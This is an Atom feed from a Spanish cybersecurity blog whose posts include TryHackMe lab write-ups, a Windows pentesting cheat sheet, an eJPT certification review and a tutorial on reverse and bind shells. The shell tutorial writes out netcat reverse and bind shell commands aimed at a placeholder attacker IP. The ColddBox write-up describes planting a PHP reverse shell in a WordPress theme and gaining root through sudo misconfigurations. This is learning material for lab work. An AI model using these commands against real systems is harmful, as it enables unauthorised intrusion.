@@ -1,0 +1,407 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-28T16:14:01+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">El baúl de Diego</title><subtitle>Cybersecurity Enthusiast &amp; Geek</subtitle><author><name>Diego Martín dos Santos</name></author><entry><title type="html">Writeup: Tryhackme ColddBox.</title><link href="http://localhost:4000/2021/04/28/Writeup-coldbox.html" rel="alternate" type="text/html" title="Writeup: Tryhackme ColddBox." /><published>2021-04-28T00:00:00+02:00</published><updated>2021-04-28T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/28/Writeup-coldbox</id><content type="html" xml:base="http://localhost:4000/2021/04/28/Writeup-coldbox.html">&lt;h1 id=&quot;enumeración&quot;&gt;Enumeración&lt;/h1&gt;
+&lt;p&gt;NMAP: Escaneo de puertos.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/sySrwwy&quot;&gt;&lt;img src=&quot;https://i.ibb.co/J5LP775/mmap1.png&quot; alt=&quot;mmap1&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;NMAP: Analísis de los puertos abiertos.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/bKJ5rqZ&quot;&gt;&lt;img src=&quot;https://i.ibb.co/NyS2LQP/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Wappalyzer &amp;amp; Whatweb: Descubrir con que tecnologías esta hecho la web.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/tbVN58T/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/b1DHTQ4/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ffuf: Enumeración de directorios(aka Fuzzing).&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/MM9s4QQ&quot;&gt;&lt;img src=&quot;https://i.ibb.co/0hQcSvv/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/phKtSFY/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;WPScan: Escaneo de WordPress, y enumeración de usuarios.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/qYfHzvp&quot;&gt;&lt;img src=&quot;https://i.ibb.co/N2P0XMK/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/phKtSFY/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;explotacion&quot;&gt;EXPLOTACION&lt;/h1&gt;
+&lt;p&gt;WPScan: Bruteforce al login de WP (encontrado haciendo fuzzing) con los usuarios encontrados en WPScan.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/7XkjZJq&quot;&gt;&lt;img src=&quot;https://i.ibb.co/bPbQCgk/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;No pudé hacer captura de los resultado pero aproximadamente en 1 minuto o menos la contraseña fue crackeado.&lt;/p&gt;
+
+&lt;p&gt;Accedemos a WP accediendo al login &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-admin&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/JryMSL6&quot;&gt;&lt;img src=&quot;https://i.ibb.co/ygYbxTv/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Comprobamos si somos administradores accediendo al apartado de usuarios, y efectivamente lo somos:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/KL0wT6Y&quot;&gt;&lt;img src=&quot;https://i.ibb.co/GtxTz7X/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Buscando en internet como conseguir una reverse shell siendo admin de WP encontré que podemos injectar una reverse shell en el fichero 404.php de la página web. En mi caso subí una reverse de php.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/X5Cz0C6&quot;&gt;&lt;img src=&quot;https://i.ibb.co/09Gf4G1/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos ponemos a la escucha…y ejecutamos la shell mediante  la ruta &lt;a href=&quot;http://ip/wp-content/themes/twentyfifteen/404.php&quot;&gt;http://ip/wp-content/themes/twentyfifteen/404.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/qpVPDwC&quot;&gt;&lt;img src=&quot;https://i.ibb.co/YhwqNGX/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Mejoramos la shell&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;script /dev/null&lt;/li&gt;
+  &lt;li&gt;Ctrl+Z&lt;/li&gt;
+  &lt;li&gt;stty raw -echo;fg&lt;/li&gt;
+  &lt;li&gt;reset&lt;/li&gt;
+  &lt;li&gt;export TERM=xterm&lt;/li&gt;
+  &lt;li&gt;export SHELL=shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/Wt2gSF5&quot;&gt;&lt;img src=&quot;https://i.ibb.co/FVDgGJ3/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Si exploramos el sistema encontramos /var/www/html/wp-config.php&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/sF7NQ8N/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos podríamos loguear a la base de datos con los datos que acabamos de encontrar, pero si recordamos, tenemos un puerto alojando ssh. Podríamos probar a ver si estamos ante un caso de reutilización de credenciales…&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/f9dRJLg/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS.&lt;/h1&gt;
+&lt;p&gt;En esta máquina tenemos 3 “binarios” que se explotan usando la misma “mala configuración”.
+Para descubrir estos binarios ejecutamos “sudo -l”
+Este comando nos arrojara que podemos ejecutar como sudo “FTP”,”VIM”, y por último “CHMOD”&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;FTP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ejecutamos ftp como sudo y luego podemos ejecutar cualquier comandos en contexto privilegiado.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/4s6gSVP/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CHMOD&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ejecutamos “sudo chmod 4777 /bin/bash” para asignar el bit suid a /bin/bash y poder ejecutarlo en un contexto privilegiado.
+Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /bin/bash -p&lt;/code&gt; ejecutas /bin/bash como root y con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; le indicamos que mantenga los privilegios al terminar de ejecutar el comando.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/cvSGG1N/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/wYG2qfb/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;VIM&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Con VIM es tan simple como que VIM ejecutará lo que pongamos como el usuario que usemos. Si añadimos sudo, lo estaremos ejecutando en un contexto privilegiado.
+&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/jMyCLT8/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="ejpt,elearn,certificacio" /><summary type="html">Enumeración NMAP: Escaneo de puertos.</summary></entry><entry><title type="html">Windows Pentesting CheatSheet</title><link href="http://localhost:4000/2021/04/27/Windows-Pentesting-CheatSheet.html" rel="alternate" type="text/html" title="Windows Pentesting CheatSheet" /><published>2021-04-27T00:00:00+02:00</published><updated>2021-04-27T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/27/Windows%20Pentesting%20CheatSheet</id><content type="html" xml:base="http://localhost:4000/2021/04/27/Windows-Pentesting-CheatSheet.html">&lt;h1 id=&quot;conectarse-al-dc-con-credenciales&quot;&gt;Conectarse al DC con credenciales.&lt;/h1&gt;
+&lt;p&gt;Te conectas al DC con las credenciales que proporcionas, y consigues una reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/vhz3RJb&quot;&gt;&lt;img src=&quot;https://i.ibb.co/BGsyFgm/EVIL-RM.png&quot; alt=&quot;EVIL-RM&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;dumpear-hashes-con-impacket-secretdump&quot;&gt;Dumpear hashes con “Impacket-SecretDump”&lt;/h1&gt;
+&lt;p&gt;Dumpea las credenciales a las cuales el usuario con el que logueas tiene acceso.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/JRZPFWJ&quot;&gt;&lt;img src=&quot;https://i.ibb.co/Rp8W4Gw/IMPACKET-SECRETDUMP.png&quot; alt=&quot;IMPACKET-SECRETDUMP&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conectarse-con-smbclient-a-un-share&quot;&gt;Conectarse con “SMBCLIENT” a un share.&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/gJv2w7V&quot;&gt;&lt;img src=&quot;https://i.ibb.co/3cf3Wsz/SMBCLIENT-CONECTARSRE.png&quot; alt=&quot;SMBCLIENT-CONECTARSRE&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeración-de-usuarios&quot;&gt;Enumeración de usuarios&lt;/h1&gt;
+&lt;p&gt;Con “impacket-GetNPUsers” (la opción más rapido con diferencia)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/RCwndZv&quot;&gt;&lt;img src=&quot;https://i.ibb.co/gDK1hHj/USER-ENUM.png&quot; alt=&quot;USER-ENUM&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Con kerbrute (fuerza bruta a KERBEROS)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/Rbch9NG&quot;&gt;&lt;img src=&quot;https://i.ibb.co/xL6mDYK/kerbrute.png&quot; alt=&quot;kerbrute&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="vulnerabilidad" /><summary type="html">Conectarse al DC con credenciales. Te conectas al DC con las credenciales que proporcionas, y consigues una reverse shell.</summary></entry><entry><title type="html">eJPT: Mi experiencia con esta certificación.</title><link href="http://localhost:4000/2021/04/20/Mi-experiencia-con-la-certificaci%C3%B3n-eJPT.html" rel="alternate" type="text/html" title="eJPT: Mi experiencia con esta certificación." /><published>2021-04-20T00:00:00+02:00</published><updated>2021-04-20T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/20/Mi%20experiencia%20con%20la%20certificaci%C3%B3n%20eJPT</id><content type="html" xml:base="http://localhost:4000/2021/04/20/Mi-experiencia-con-la-certificaci%C3%B3n-eJPT.html">&lt;h1 id=&quot;ejpt-qué-es-eso&quot;&gt;¿eJPT? ¿Qué es eso?&lt;/h1&gt;
+
+&lt;p&gt;Según la propia empresa:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The eLearnSecurity Junior Penetration Tester (eJPT) is a 100% practical certification on penetration testing and information security essentials. By passing the exam, a cyber security professional proves to employers they are ready for a rewarding new career.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Según mi experiencia,con mis propias palabras:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Es la certificación de pentesting y ciberseguridad ideal si quieres mostrar al mundo que tienes el conocimiento suficiente para considerarte Junior, apto para iniciar tu carrera profesional en el sector de la ciberseguridad y el pentesting (Penetration Testing).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;en-qué-consiste&quot;&gt;¿En qué consiste?&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Examen: Realizado por la empresa certificadora (eLearnSecurity)&lt;/li&gt;
+  &lt;li&gt;Curso (opcional) : Realizado por la empresa que se encarga del contenido creado especificamente para esta certificación (INE.COM)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;cómo-funciona-el-curso-es-de-pago-o-gratuito&quot;&gt;¿Cómo funciona el curso? ¿Es de pago o gratuito?&lt;/h1&gt;
+
+&lt;p&gt;El temario del curso, el cual es gratuito,está compuesto de:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Diapositivas (presentaciones)&lt;/li&gt;
+  &lt;li&gt;PDFs&lt;/li&gt;
+  &lt;li&gt;Videos&lt;/li&gt;
+  &lt;li&gt;Máquinas vulnerables: Despues de leerte y ver todo, dispones en la mayoria de temas de una máquina vulnerable diseñada especificamente para que la explotes (vulneres) y probar que has aprendido todo lo que te han enseñado. Y…¡no te preocupes! Si no eres capaz de realizarlas tendrás las soluciones las cuales recomiendo leer y seguir al pie de la letra para aprender lo que te cuesta.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Dentro del temario hay muchos temas, pero hay 3 temas “GENERALES”:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Conocimientos básicos (Penetration Testing Prerequisites) –&amp;gt; Para quienes apenas tienen conocimiento de algunos temas como redes, modelo OSI,TCP/IP…Y otra cosas, que aunque son teorícas y a nadie le apetece estudiar, son necesarias para entender que pasa detrás de todos los ataques que ejecutamos, tanto en enumeración, ejecucción…etc.&lt;/li&gt;
+  &lt;li&gt;Programación (Penetration Testing: Preliminary Skills &amp;amp; Programming) –&amp;gt; Esta parte personalmente yo me la salté por dos motivos: Ya tengo conocimientos de programación y me dijeron que no entraba en el examen. Sin embargo, os la recomiendo mucho si no sabeis programar ya que viene bien tener conocimientos básicos de programación para ser capaces de leer exploits y modificarlos. (Más bien es necesario). En resúmen: Si sabes programar (con soltura) saltate la parte de programación del curso. Si no sabes te recomiendo encarecidamente que la curses.&lt;/li&gt;
+  &lt;li&gt;Pentesting puro y duro (Penetration Testing Basics) –&amp;gt; Aquí te enseñan lo que vienes a buscar: Hacking. Desde simples escaneos de puertos, pasando por fuerza bruta,LFI,RFI,Listeners,Burpsuite,Wireshark,Pivoting, hasta ejecucción de exploits y escalada de privilegios. (Me he dejado muchas cosas, te enseñan de todo, sales del curso con una base enorme.)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;cómo-puedo-saber-si-estoy-preparado&quot;&gt;¿Cómo puedo saber si estoy preparado?&lt;/h1&gt;
+
+&lt;p&gt;Al terminarte todo el temario y todos los labs(máquinas vulnerables) dispondrás de 3 labs finales (llamados black box 1, 2 y 3 respectivamente).
+Básicamente, cada blackbox es una red a explotar, parecida a la red del examen. Aquí podrás probar tus conocimientos. Dispones de las soluciones pero recomiendo no mirarlas a no ser que sea 100% necesario. Si las miras, asegurate de compronder todo lo que haces y de tomar apuntes.&lt;/p&gt;
+
+&lt;h1 id=&quot;el-examen&quot;&gt;El examen.&lt;/h1&gt;
+
+&lt;p&gt;Por obvias razones no puedo hablar en que consiste el examen ni hablar sobre el mismo, ya que la empresa lo prohíbe, pero si puedo deciros que es un examen el cual se aprueba 100% si has realizado el curso al completo y han entendido y practicado todos los conceptos: El curso está hecho para que apruebes el examen.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusión-la-recomiendo&quot;&gt;Conclusión: ¿La recomiendo?&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La respuesta es un rotundo si. Si te estas iniciando en este mundillo y quieres certificarte para hacerte ver o simplemente para probar tus conocimientos, la recomiendo.&lt;/li&gt;
+  &lt;li&gt;Pero nunca hay que olvidarse: Es una certificación de inicio. Despues de sacaros esta os recomiendo NO parar de estudiar, seguir todos los dias hasta tener al menos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSCP&lt;/code&gt; o el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eCPPT&lt;/code&gt; , que son certificaciones mucho más reconocidas, díficiles (y caras).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;enlaces-de-interés&quot;&gt;Enlaces de interés&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ine.com/pages/cybersecurity&quot;&gt;Curso PTS impartido por INE&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://elearnsecurity.com/product/ejpt-certification/&quot;&gt;Examen realizado por eLearnSecurity&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="ejpt,elearn,certificacio" /><summary type="html">¿eJPT? ¿Qué es eso?</summary></entry><entry><title type="html">Tipos de Shell: Reverse,Bind, y como pueden ser según su interactividad</title><link href="http://localhost:4000/2021/04/17/Tipos-de-shell.html" rel="alternate" type="text/html" title="Tipos de Shell: Reverse,Bind, y como pueden ser según su interactividad" /><published>2021-04-17T00:00:00+02:00</published><updated>2021-04-17T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/17/Tipos%20de%20shell</id><content type="html" xml:base="http://localhost:4000/2021/04/17/Tipos-de-shell.html">&lt;h1 id=&quot;qué-es-una-shell&quot;&gt;¿Qué es una shell?&lt;/h1&gt;
+
+&lt;p&gt;Cuando la mayoría de la gente ve esto, y ve que interactuamos con ello, nos tachan de hackers u otras cosas parecidas, pero nada más lejos de la realidad. La shell, que en terminos técnicos es “un interprete de comandos” nos permite interactuar con el sistema.&lt;/p&gt;
+
+&lt;p&gt;Al igual que con el teclado y ratón, si nos esforzamos un poquito en entender y aprender a usar la terminal, seremos muchísimos más productivo y eficientes, y entenderemos mejor como funciona todo, además de tener muchísimas más posibilidades.&lt;/p&gt;
+
+&lt;p&gt;Ahora bien, en este post estamos tratando las shell desde el punto de visto de conseguir acceso a máquina víctimas, por tanto hay que tener esto en cuenta: Cuando se dice “he consigo una shell” suele referirse a que tenemos ejecucción de comandos en la máquina víctima, aunque sea en un contexto de usuario no privilegiado.&lt;/p&gt;
+
+&lt;h1 id=&quot;tipos-de-shell-según-la-forma-en-la-que-la-conseguimos&quot;&gt;Tipos de Shell según la forma en la que la conseguimos.&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Reverse Shell: La máquina es forzada a ejecutar código que conecta con nuestro ordenador. Es decir, cuando nosotros como ATACANTES nos ponemos a la escucha con, por ejemplo NETCAT…y logramos que la máquina ejecute cierto comando, recibiremos una  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REVERSE SHELL&lt;/code&gt;…&lt;/li&gt;
+  &lt;li&gt;Bind Shell: El código ejecutado en la máquina víctima se usa para ejecutar un listener que apunta directamente a la shell víctima.
+Esto, al ser extremedamente peligroso, suele estar bloqueado por el firewall.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ejemplo de ponernos a la escucha (reverse shell) en el puerto 1234 con nc(netcat).&lt;/code&gt;
+&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/kg3PnWM/nc.png&quot; alt=&quot;nc&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cuando-conseguimos-una-shell-cómo-puede-ser&quot;&gt;Cuando conseguimos una shell ¿Cómo puede ser?&lt;/h1&gt;
+
+&lt;p&gt;Interactica o no interactiva:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Interactiva: Como su nombre indica, podemos interactuar con ella de manera interactiva. Por ejemplo, al hacer una conexión SSH, cuando nos pregunta si estamos seguro de que si queremos seguir adelante, lo veremos y podremos contestar.&lt;/li&gt;
+  &lt;li&gt;No interactiva: Al contrario que en las interactivas, no veremos ni podremos contestar a mensajes por consola. Solo podremos ejecutar comandos y ver su salida simple.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;ejemplos-de-uso-para-entender-las-definiciones-mejor&quot;&gt;Ejemplos de uso para entender las definiciones mejor:&lt;/h1&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reverse Shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Máquina atacante (nosotros): Nos ponemos a la escucha con netcat en el puerto 1234:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Máquina víctima: Nos manda una shell (ejemplo Linux)&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc ip_atacante 443 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esto sería lo que tendríamos que conseguir en la máquina víctima de una forma u otra, ya sea subiendo fichero, con ejecución remota de comandos, o de mil maneras que se nos podrían ocurrir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bind Shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Máquina víctima: La ponemos a a la escucha (ejemplo Windows)&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Máquina atacante (nosotros):&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc ip_víctima 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="shell,reverse" /><summary type="html">¿Qué es una shell?</summary></entry><entry><title type="html">TryHackMe Overpass 2 - Wireshark</title><link href="http://localhost:4000/2021/04/02/TryHackMe-Overpass-2-Wireshark.html" rel="alternate" type="text/html" title="TryHackMe Overpass 2 - Wireshark" /><published>2021-04-02T00:00:00+02:00</published><updated>2021-04-02T00:00:00+02:00</updated><id>http://localhost:4000/2021/04/02/TryHackMe%20Overpass%202%20-%20Wireshark</id><content type="html" xml:base="http://localhost:4000/2021/04/02/TryHackMe-Overpass-2-Wireshark.html">&lt;h1 id=&quot;máquina-tryhackme-overpass-2&quot;&gt;Máquina TryHackMe: Overpass 2&lt;/h1&gt;
+
+&lt;p&gt;Máquina de la plataforma de TryHackMe que trata sobre análisis de paquetes.&lt;/p&gt;
+
+&lt;p&gt;Aprenderemos:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;A movernos por Wireshark.&lt;/li&gt;
+  &lt;li&gt;A leer Wireshark de una forma eficiente.&lt;/li&gt;
+  &lt;li&gt;A aplicar filtros a Wireshark.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;cúal-era-la-url-de-la-página-que-se-uso-para-subir-la-reverse-shell&quot;&gt;¿Cúal era la URL de la página que se uso para subir la reverse shell?&lt;/h1&gt;
+
+&lt;p&gt;Para responder a esta pregunta lo primero que tenemos que entender es que para subir y bajar ficheros se usa el protocolo HTTP, con sus distintos métodos.
+Por eso, para responder a esta cuestión, filtraremos todos los paquetes por el protocolo HTTP, de la siguiente manera:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/9qdsLsv&quot;&gt;&lt;img src=&quot;https://i.ibb.co/BgYqxqP/HTTP.png&quot; alt=&quot;HTTP&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Así conseguiremos reducir drastricamente el numero de paquetes a revisar . ( De 3896 a 15 paquetes, eso es ahorrar muchisimo tiempo, analizaremos solo un 0,3 % de los paquetes totales del fichero .pcap)&lt;/p&gt;
+
+&lt;p&gt;Con estos paquetes, iremos uno por uno siguiendo la trama TCP, para analizarlo más en profundidad.&lt;/p&gt;
+
+&lt;p&gt;Si nos fijamos, en la pestaña “INFO” de cada paquete, nos pone que se ha realizado una peitición HTTP post a /upload.php, lo cual nos da a entender que se ha subido un fichero, lo cual es interesante, asi que lo analizaremos siguiendo la trama TCP…&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/9qdsLsv&quot;&gt;&lt;img src=&quot;https://i.ibb.co/BgYqxqP/HTTP.png&quot; alt=&quot;HTTP&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui es donde descubriremos la segunda respuesta: El payload.&lt;/p&gt;
+
+&lt;p&gt;Seguiremos la trama TCP y nos daremos cuenta de que ahí se encontrará el payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/LN7wjvB&quot;&gt;&lt;img src=&quot;https://i.ibb.co/J3JL6C8/payload.png&quot; alt=&quot;payload&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;q2-qué-contraseña-uso-el-atacante-para-conseguir-escalar-privilegios&quot;&gt;Q2: ¿Qué contraseña uso el atacante para conseguir escalar privilegios?&lt;/h1&gt;
+
+&lt;p&gt;Aquí, tras haber leído todas las peticiones HTTP previamente filtrada, me puse a pensar…&lt;/p&gt;
+
+&lt;p&gt;¿Cómo habra realizado la escalada de privilegios, si usó una reverse shell con PHP?&lt;/p&gt;
+
+&lt;p&gt;Y llegué a la conclusión de que la habría conseguido mediante NETCAT (aka nc).&lt;/p&gt;
+
+&lt;p&gt;Por tanto me puse a investigar los paquetes TCP, el problema es que había muchisimos. Y otra vez tocaba pensar…¿Cómo hago un vistazo rápido, que estoy buscando? Y la respuesta fue: La escalada de privilegios, son comandos, mucho texto, datos, data… Basicamente estabamos buscando una trama “grande”, con muchos datos, comandos, input(comandos) y output(salida de esos comandos)…&lt;/p&gt;
+
+&lt;p&gt;Asi que simplemente me puse a ver las peticiones las cuales su lenght era superior a la media (que rondaba entre 60-70, las cuales son muchísimas, por tanto ordené los paquetes según su length.&lt;/p&gt;
+
+&lt;p&gt;Tras apenas un minuto siguiendo las tramas de estas peticiones, llegue a una que contenía un LENGTH de 121. Lo que me llamo la atención de esta petición no fue el LENGTH , fue que contenía “DATA”.&lt;/p&gt;
+
